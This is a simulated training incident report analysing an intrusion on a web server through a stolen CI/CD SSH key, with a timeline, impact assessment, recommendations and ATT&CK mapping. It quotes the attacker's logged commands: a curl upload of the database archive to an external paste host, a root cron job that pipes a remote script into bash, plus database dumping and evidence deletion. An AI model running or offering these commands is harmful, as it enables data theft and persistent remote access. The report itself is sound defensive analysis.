# Incident Report — INC-002: Data Exfiltration and Backdoor via Compromised CI/CD Credentials on web-prod02

| | |
|---|---|
| **Host** | web-prod02 |
| **Date of incident** | 14 September 2026 |
| **Analyst** | Ali Jama |
| **Date of report** | 27 September 2026 |
| **Classification** | Confirmed intrusion — data exfiltration, root-level persistence established |
| **Status** | Open — not contained. Containment actions are set out in Section 5. |
| **Evidence source** | `mission-002-auth.log` (SSH, sudo and cron events) |

> Training exercise completed in a simulated environment. All hostnames, usernames, IP addresses and domains are fictional.

---

## 1. Executive Summary

An attacker used a valid SSH key for the `deploy-ci` service account, connecting from an external address instead of its usual internal source, to gain root access on the production web server. They searched the system for further privilege-escalation opportunities, read the application's secrets file, dumped the production database, packaged it together with customer invoice files, and uploaded the package to an external file-sharing site. They then deleted the local copies to cover their tracks and installed a scheduled root task that downloads and runs remote code every time it fires, giving them a way back in independent of the stolen key.

---

## 2. Timeline of Events

All times are server local time, 14 September 2026. Every row is supported by a line in the log. An unrelated, unsuccessful brute-force attack is covered separately in Section 3.

| Time | Event | Evidence |
|---|---|---|
| 19:10 – 21:29 | Normal activity: staff logins by SSH key from the internal range 10.44.7.0/24, routine `systemctl restart php8.3-fpm` calls, and scheduled cron jobs | Baseline |
| 21:31:00 | **Initial access.** `deploy-ci` authenticates with a valid public key, but from 103.77.214.9 — outside the internal 10.44.7.0/24 range this account normally uses | `Accepted publickey for deploy-ci from 103.77.214.9` |
| 21:32:13 | **Privilege-escalation reconnaissance.** Search for all SUID binaries on the system | `sudo ... COMMAND=/usr/bin/find / -perm -4000 -type f` |
| 21:33:05 | **Secrets theft.** Application environment file read, exposing database and service credentials | `sudo ... COMMAND=/bin/cat /var/www/shop/.env` |
| 21:33:43 | **Database dump.** Full export of the production database | `sudo ... COMMAND=/usr/bin/mysqldump -u shop_admin shop_prod` |
| 21:35:19 | **Data staged for exfiltration.** Database dump and customer invoice files archived together | `sudo ... COMMAND=/usr/bin/tar -czf /tmp/.cache-2026.tar.gz /tmp/shop_prod.sql /var/www/shop/storage/invoices` |
| 21:36:20 | **Exfiltration.** Archive uploaded to an external file-sharing host | `sudo ... COMMAND=/usr/bin/curl -X POST -F file=@/tmp/.cache-2026.tar.gz https://files.arcticpaste.io/u` |
| 21:36:45 | **Anti-forensics.** Local copies of the archive and SQL dump deleted | `sudo ... COMMAND=/bin/rm -f /tmp/.cache-2026.tar.gz /tmp/shop_prod.sql` |
| 21:37:29 | **Persistence installed.** Root's crontab overwritten | `sudo ... COMMAND=/usr/bin/crontab -u root -` |
| 21:40:29 | **Backdoor confirmed active.** The new cron job fires, downloading and executing a remote script as root | `CRON (root) CMD (curl -fsSL https://cdn.arcticpaste.io/h.sh \| /bin/bash)` |
| 21:40:59 | Attacker's SSH session disconnects | `Received disconnect from 103.77.214.9` |

The intrusion, from initial login to a live backdoor, took under ten minutes.

---

## 3. Evidence

**Attacker infrastructure**
- `103.77.214.9` — source of the `deploy-ci` session and the actions in Section 2
- `files.arcticpaste.io` — exfiltration destination for the stolen database and invoices
- `cdn.arcticpaste.io` — source of the remote script fetched by the planted cron job

**Accounts involved**
- `deploy-ci` — **compromised or abused.** Authenticated with a valid key, so this was not a guessed or brute-forced credential. The account holds broad sudo rights, which is what let a single login lead to full data exfiltration and a root-level backdoor.

**Unrelated attack: ruled out**

A separate brute-force campaign ran from `91.218.144.53` between 19:58:03 and 19:59:50, trying 57 combinations of common usernames (root, admin, mysql, ubuntu, pi, ftpuser, deploy, www-data). Every attempt failed, and the source closed its own connection at 19:59:50 with no successful authentication anywhere in the log. This is unrelated noise, not the source of the breach, and no account was compromised by it. It is a full 90 minutes before the `deploy-ci` login and shares no IP, account, or technique with the actual incident.

**Accounts ruled out**

b.fairweather, c.oyelaran, m.delgado, p.lindqvist and k.ashworth all authenticated by SSH key from internal addresses throughout, and their occasional single failed logins (e.g. m.delgado at 19:24:36, c.oyelaran at 21:00:21) are consistent with ordinary typing errors, not attack activity. Their sudo use was limited to routine `systemctl restart php8.3-fpm` calls and one log check by b.fairweather at 22:12–22:14, all from internal sessions.

---

## 4. Assessment of Impact

**Severity: Critical.**

- **Confidentiality** — The production database and customer invoice files were exfiltrated to an external site. This should be treated as a full data breach requiring customer and regulatory notification. Application secrets in `.env` were also read and must be treated as compromised.
- **Integrity** — Root access was obtained and a scheduled task now runs attacker-supplied code as root on every trigger. Nothing on this host can be trusted until it is rebuilt.
- **Availability** — No disruption observed, but the attacker retains the ability to cause it at will through the planted cron job.
- **Persistence** — Access does not depend on the `deploy-ci` key remaining valid. The root crontab now independently fetches and executes remote code.
- **Evidence loss** — The attacker deleted the local database dump and archive; only the paste-site upload record (via the log) confirms what was taken. The actual contents of `.env` and the database are not recoverable from this log alone.

**Scope uncertainty:** how the `deploy-ci` key was obtained (leaked, stolen from a CI/CD pipeline, or insider misuse) cannot be determined from authentication logs alone. This report covers this host only; other systems reachable with credentials found in `.env` should be assumed at risk until checked.

---

## 5. Recommendations

**Immediate (within 1 hour)**
1. Isolate web-prod02 from the network. Do not power it off — volatile memory may hold evidence.
2. Remove the malicious entry from root's crontab and block `cdn.arcticpaste.io` / `files.arcticpaste.io` at the perimeter firewall.
3. Revoke the `deploy-ci` SSH key immediately and disable the account pending investigation.
4. Rotate every credential that appeared in `/var/www/shop/.env` (database, third-party API keys, application secrets).

**Short term (24–72 hours)**
5. Rebuild web-prod02 from known-good media. Do not attempt to clean it — a root-compromised host cannot be trusted.
6. Determine how the `deploy-ci` key was used from 103.77.214.9 — check the CI/CD platform's own access logs, since this host's logs cannot show that.
7. Begin data-breach assessment: confirm what the exfiltrated archive contained and whether customer notification obligations apply.
8. Audit all hosts reachable with credentials from the stolen `.env` file.

**Longer term**
9. Restrict `deploy-ci` (and other automation accounts) to the specific IP ranges they should ever connect from, and alert on any login outside that range.
10. Apply least privilege to service accounts: scope sudo rights to the exact commands each automation task needs, not unrestricted root.
11. Forward logs to a central SIEM in real time so local deletion of evidence files doesn't remove the only record.
12. Alert on any change to root's crontab and on outbound uploads to previously unseen destinations.

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Credential Access | Brute Force: Password Guessing | T1110.001 | 57 failed attempts from 91.218.144.53 (unrelated, unsuccessful) |
| Initial Access | Valid Accounts | T1078 | `deploy-ci` authenticates with a valid key from an unusual external address |
| Discovery | Setuid and Setgid Abuse (reconnaissance) | T1548.001 | `find / -perm -4000 -type f` |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | `cat /var/www/shop/.env` |
| Collection | Data from Local System | T1005 | `mysqldump -u shop_admin shop_prod` |
| Collection | Archive Collected Data: Archive via Utility | T1560.001 | `tar -czf /tmp/.cache-2026.tar.gz ...` |
| Exfiltration | Exfiltration Over Web Service | T1567 | `curl -X POST ... https://files.arcticpaste.io/u` |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 | `rm -f /tmp/.cache-2026.tar.gz /tmp/shop_prod.sql` |
| Persistence | Scheduled Task/Job: Cron | T1053.003 | `crontab -u root -` followed by the job firing at 21:40:29 |
| Command and Control | Ingress Tool Transfer | T1105 | `curl -fsSL https://cdn.arcticpaste.io/h.sh` |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | `... \| /bin/bash` |

---

## 7. Analyst Notes — Confidence and Gaps

- **High confidence:** the sequence of reconnaissance, secrets theft, database dump, exfiltration, evidence deletion, and cron persistence. All directly evidenced and in a clear, uninterrupted order within one ten-minute session.
- **Medium confidence:** that the two events are unrelated. The 90-minute gap, the different IP, and the complete absence of any successful login from 91.218.144.53 make a connection unlikely, but this log alone cannot prove the two are unconnected actors rather than the same one using different infrastructure.
- **Unknown:** how the `deploy-ci` key was obtained. This log shows the key was valid and used successfully — it cannot show whether it was phished, leaked in a repository, stolen from a build server, or misused by an insider with legitimate access. This is the single most important open question for the investigation.
- **Unknown:** the exact contents of the exfiltrated archive and whether it was downloaded by anyone else from the paste site before removal.
- **Evidence limitation:** this log shows the command run to dump root's crontab (`crontab -u root -`), which reads standard input, but not the payload piped into it. The cron job's own execution at 21:40:29 is what confirms the backdoor is real and active.
